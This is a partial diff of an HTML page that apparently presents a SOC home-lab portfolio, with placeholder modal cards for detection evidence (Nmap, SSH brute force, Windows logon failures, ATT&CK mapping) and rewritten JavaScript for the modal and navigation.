+             data-details="Show alert title, source IP, destination IP, and protocol|Pair with one short case explanation|Use this to support reconnaissance and traffic investigation stories.">
+          <span class="shot-label">Security Onion Alerts</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Suricata Nmap Detection"
+             data-labels="suricata, t1046, reconnaissance"
+             data-description="Sample modal for an Nmap detection story tied to ATT&amp;CK technique T1046 and network service discovery."
+             data-details="Show rule name and timestamp|Add attacker IP and target range|Link this frame to your reconnaissance simulation file.">
+          <span class="shot-label">Suricata Nmap Detection</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Linux auth.log Brute Force"
+             data-labels="linux, auth.log, t1110"
+             data-description="Sample log evidence frame for repeated failed SSH logins and source-IP correlation inside the SIEM workflow."
+             data-details="Show 3–5 repeated failed password entries|Pair with Hydra command evidence|Use this as the strongest Linux investigation screenshot.">
+          <span class="shot-label">Linux auth.log Brute Force</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Windows Event ID 4625"
+             data-labels="windows, event 4625, authentication"
+             data-description="Sample modal for Windows failed logon evidence pulled from Event Viewer or centralized collection."
+             data-details="Show host name, account, and source network context|Use Sysmon or Wazuh correlation nearby|Tie it to your Windows logon case file.">
+          <span class="shot-label">Windows Event ID 4625</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="MITRE ATT&amp;CK Mapping"
+             data-labels="mitre, coverage, reporting"
+             data-description="Sample modal for technique mapping that connects your simulations, detections, and investigation reports to ATT&amp;CK."
+             data-details="Show T1046, T1110, T1021, and T1059 mappings|Use this in reports and detection strategy|Keep the layout clean and readable.">
+          <span class="shot-label">MITRE ATT&amp;CK Mapping</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Incident Report Summary"
+             data-labels="report, evidence, conclusion"
+             data-description="Sample incident-summary modal with severity, evidence links, analyst conclusion, and suggested next steps."
+             data-details="Add alert source and affected asset|Embed screenshot references and ATT&amp;CK mapping|Use this frame to demonstrate analyst communication quality.">
+          <span class="shot-label">Incident Report Summary</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="modal" id="cardModal" aria-hidden="true" role="dialog" aria-modal="true" data-close="true">
+    <div class="modal-dialog">
+      <div class="modal-hero"></div>
+      <div class="modal-content">
+        <div class="modal-top">
+          <div>
+            <h2 id="modalTitle" style="margin:0;">Preview</h2>
+            <div class="modal-meta" id="modalMeta"></div>
+          </div>
+          <button class="modal-close" id="modalClose" type="button" data-close="true" aria-label="Close preview">✕</button>
+        </div>
+
+        <div class="modal-layout">
+          <div>
+            <p id="modalDescription">Sample evidence description appears here.</p>
+
+            <div class="frame-grid" style="margin-top:16px;">
+              <div class="sample-frame">
+                <div class="sample-frame-head">
+                  <span id="modalFrameTitle">Preview frame</span>
+                  <div class="sample-dots"><span></span><span></span><span></span></div>
+                </div>
+                <div class="sample-frame-body" id="modalFrameText">
+                  Replace this area with a real screenshot, cropped dashboard image, terminal capture, or investigation view from the repository website.
+                  <div class="sample-bars" style="margin-top:12px;">
+                    <span></span><span></span><span></span><span></span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="sample-frame">
+                <div class="sample-frame-head">
+                  <span>Command / analyst note</span>
+                  <div class="sample-dots"><span></span><span></span><span></span></div>
+                </div>
+                <div class="sample-frame-body" id="modalAnalystNote">
+                  Use the second frame for the related command, SIEM note, MITRE tag, or the short analyst explanation that supports the preview.
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <aside class="modal-side">
+            <h4>Highlights</h4>
+            <ul id="modalList">
+              <li>Sample detail</li>
+              <li>Another supporting point</li>
+              <li>Use this area for evidence notes.</li>
+            </ul>
+          </aside>
+        </div>
       </div>
     </div>
   </div>
-</div>
-
- 
 
   <footer class="footer">
     <div class="container">
       This version is now customized around your real repository structure: docs, architecture, infrastructure, detections, simulations, investigations, reports, and website content presented as a Netflix-style GitHub Pages experience.
     </div>
   </footer>
+
   <script>
- <script>
-(() => {
-  const modal = document.getElementById("cardModal");
-  const modalTitle = document.getElementById("modalTitle");
-  const modalDescription = document.getElementById("modalDescription");
-  const modalList = document.getElementById("modalList");
-  const modalMeta = document.getElementById("modalMeta");
-  const closeBtn = document.getElementById("modalClose");
-  const cards = document.querySelectorAll(".modal-card");
-  let lastTrigger = null;
+    document.addEventListener("DOMContentLoaded", () => {
+      const navLinks = document.querySelectorAll(".nav-links a");
+      const sections = document.querySelectorAll("section[id]");
 
-  if (!modal || !modalTitle || !modalDescription || !modalList || !modalMeta || !closeBtn) return;
-
-  function buildPills(labels) {
-    modalMeta.innerHTML = "";
-    labels.split(",").map(v => v.trim()).filter(Boolean).forEach(label => {
-      const pill = document.createElement("span");
-      pill.className = "pill";
-      pill.textContent = label;
-      modalMeta.appendChild(pill);
-    });
-  }
-
-  function buildList(details) {
-    modalList.innerHTML = "";
-    details.split("|").map(v => v.trim()).filter(Boolean).forEach(item => {
-      const li = document.createElement("li");
-      li.textContent = item;
-      modalList.appendChild(li);
-    });
-  }
-
-  function openModal(card) {
-    lastTrigger = card;
-    modalTitle.textContent = card.dataset.title || "Details";
-    modalDescription.textContent = card.dataset.description || "";
-    buildPills(card.dataset.labels || "");
-    buildList(card.dataset.details || "");
-    modal.classList.add("is-open");
-    modal.setAttribute("aria-hidden", "false");
-    document.body.style.overflow = "hidden";
-    closeBtn.focus();
-  }
-
-  function closeModal() {
-    modal.classList.remove("is-open");
-    modal.setAttribute("aria-hidden", "true");
-    document.body.style.overflow = "";
-    if (lastTrigger) lastTrigger.focus();
-  }
-
-  cards.forEach(card => {
-    card.addEventListener("click", () => openModal(card));
-    card.addEventListener("keydown", event => {
-      if (event.key === "Enter" || event.key === " ") {
-        event.preventDefault();
-        openModal(card);
-      }
-    });
-  });
-
-  modal.addEventListener("click", event => {
-    if (event.target.dataset.close === "true") closeModal();
-  });
-
-  closeBtn.addEventListener("click", closeModal);
-
-  document.addEventListener("keydown", event => {
-    if (event.key === "Escape" && modal.classList.contains("is-open")) {
-      closeModal();
-    }
-  });
-})();
-
-document.addEventListener("DOMContentLoaded", () => {
-  const track = document.getElementById("heroCarouselTrack");
-  const dotsWrap = document.getElementById("heroCarouselDots");
-  const slides = track ? Array.from(track.children) : [];
-  const dots = dotsWrap ? Array.from(dotsWrap.children) : [];
-  const prevBtn = document.querySelector(".hero-carousel-btn.prev");
-  const nextBtn = document.querySelector(".hero-carousel-btn.next");
-  const shell = document.querySelector(".hero-carousel-shell");
-
-  if (!track || !slides.length) return;
-
-  let currentIndex = 0;
-  let autoRotate = null;
-
-  function updateCarousel(index) {
-    currentIndex = (index + slides.length) % slides.length;
-    track.style.transform = `translateX(-${currentIndex * 100}%)`;
-
-    dots.forEach((dot, i) => {
-      dot.classList.toggle("is-active", i === currentIndex);
-    });
-  }
-
-  function nextSlide() {
-    updateCarousel(currentIndex + 1);
-  }
-
-  function prevSlide() {
-    updateCarousel(currentIndex - 1);
-  }
-
-  function startAutoRotate() {
-    stopAutoRotate();
-    autoRotate = setInterval(nextSlide, 5000);
-  }
-
-  function stopAutoRotate() {
-    if (autoRotate) {
-      clearInterval(autoRotate);
-      autoRotate = null;
-    }
-  }
-
-  prevBtn?.addEventListener("click", () => {
-    prevSlide();
-    startAutoRotate();
-  });
-
-  nextBtn?.addEventListener("click", () => {
-    nextSlide();
-    startAutoRotate();
-  });
-
-  dots.forEach((dot, index) => {
-    dot.addEventListener("click", () => {
-      updateCarousel(index);
-      startAutoRotate();
-    });
-  });
-
-  shell?.addEventListener("mouseenter", stopAutoRotate);
-  shell?.addEventListener("mouseleave", startAutoRotate);
-
-  updateCarousel(0);
-  startAutoRotate();
-});
-
-document.addEventListener("DOMContentLoaded", () => {
-  const navLinks = document.querySelectorAll(".nav-links a");
-  const sections = document.querySelectorAll("section[id]");
-
-  if (!navLinks.length || !sections.length) return;
-
-  const observer = new IntersectionObserver(
-    entries => {
-      entries.forEach(entry => {
-        if (!entry.isIntersecting) return;
-        const id = entry.target.getAttribute("id");
-        navLinks.forEach(link => {
-          link.classList.toggle("active-link", link.getAttribute("href") === `#${id}`);
+      navLinks.forEach((link) => {
+        link.addEventListener("click", () => {
+          navLinks.forEach((item) => item.classList.remove("active-link"));
+          link.classList.add("active-link");
         });
       });
-    },
-    {
-      threshold: 0.35,
-      rootMargin: "-10% 0px -45% 0px"
-    }
-  );
 
-  sections.forEach(section => observer.observe(section));
+      const observer = new IntersectionObserver(
+        (entries) => {
+          entries.forEach((entry) => {
+            if (!entry.isIntersecting) return;
+            const id = entry.target.getAttribute("id");
+            navLinks.forEach((link) => {
+              link.classList.toggle("active-link", link.getAttribute("href") === `#${id}`);
+            });
+          });
+        },
+        {
+          threshold: 0.35,
+          rootMargin: "-10% 0px -45% 0px",
+        }
+      );
 
-  navLinks.forEach(link => {
-    link.addEventListener("click", () => {
-      navLinks.forEach(item => item.classList.remove("active-link"));
-      link.classList.add("active-link");
+      sections.forEach((section) => observer.observe(section));
+
+      const scrollers = document.querySelectorAll(".scroller, .hero-slider-track");
+      scrollers.forEach((scroller) => {
+        scroller.addEventListener(
+          "wheel",
+          (event) => {
+            if (Math.abs(event.deltaY) > Math.abs(event.deltaX)) {
+              event.preventDefault();
+              scroller.scrollLeft += event.deltaY;
+            }
+          },
+          { passive: false }
+        );
+      });
+
+      const modal = document.getElementById("cardModal");
+      const modalTitle = document.getElementById("modalTitle");
+      const modalDescription = document.getElementById("modalDescription");
+      const modalList = document.getElementById("modalList");
+      const modalMeta = document.getElementById("modalMeta");
+      const closeBtn = document.getElementById("modalClose");
+      const modalFrameTitle = document.getElementById("modalFrameTitle");
+      const modalFrameText = document.getElementById("modalFrameText");
+      const modalAnalystNote = document.getElementById("modalAnalystNote");
+      const cards = document.querySelectorAll(".modal-card");
+      let lastTrigger = null;
+
+      function buildPills(labels) {
+        modalMeta.innerHTML = "";
+        labels.split(",").map(v => v.trim()).filter(Boolean).forEach(label => {
+          const pill = document.createElement("span");
+          pill.className = "pill";
+          pill.textContent = label;
+          modalMeta.appendChild(pill);
+        });
+      }
+
+      function buildList(details) {
+        modalList.innerHTML = "";
+        details.split("|").map(v => v.trim()).filter(Boolean).forEach(item => {
+          const li = document.createElement("li");
+          li.textContent = item;
+          modalList.appendChild(li);
+        });
+      }
+
+      function openModal(card) {
+        lastTrigger = card;
+        const title = card.dataset.title || "Details";
+        const description = card.dataset.description || "";
+        const labels = card.dataset.labels || "";
+        const details = card.dataset.details || "";
+
+        modalTitle.textContent = title;
+        modalDescription.textContent = description;
+        modalFrameTitle.textContent = `${title} Preview`;
+        modalFrameText.innerHTML = `
+          This is a placeholder content area for <strong>${title}</strong>. Replace it with a cropped screenshot, alert pane, diagram preview, or terminal output from your project.
+          <div class="sample-bars" style="margin-top:12px;">
+            <span></span><span></span><span></span><span></span>
+          </div>
+        `;
+        modalAnalystNote.textContent = `Analyst note: use this area to summarize why ${title.toLowerCase()} matters, what evidence supports it, and how it connects to your SOC workflow.`;
+
+        buildPills(labels);
+        buildList(details);
+
+        modal.classList.add("is-open");
+        modal.setAttribute("aria-hidden", "false");
+        document.body.style.overflow = "hidden";
+        closeBtn.focus();
+      }
+
+      function closeModal() {
+        modal.classList.remove("is-open");
+        modal.setAttribute("aria-hidden", "true");
+        document.body.style.overflow = "";
+        if (lastTrigger) lastTrigger.focus();
+      }
+
+      cards.forEach((card) => {
+        card.addEventListener("click", () => openModal(card));
+        card.addEventListener("keydown", (event) => {
+          if (event.key === "Enter" || event.key === " ") {
+            event.preventDefault();
+            openModal(card);
+          }
+        });
+      });
+
+      modal.addEventListener("click", (event) => {
+        if (event.target.dataset.close === "true") closeModal();
+      });
+
+      closeBtn.addEventListener("click", closeModal);
+
+      document.addEventListener("keydown", (event) => {
+        if (event.key === "Escape" && modal.classList.contains("is-open")) {
+          closeModal();
+        }
+      });
     });
-  });
-});
-</script>
-</script>
+  </script>
 </body>
 </html>
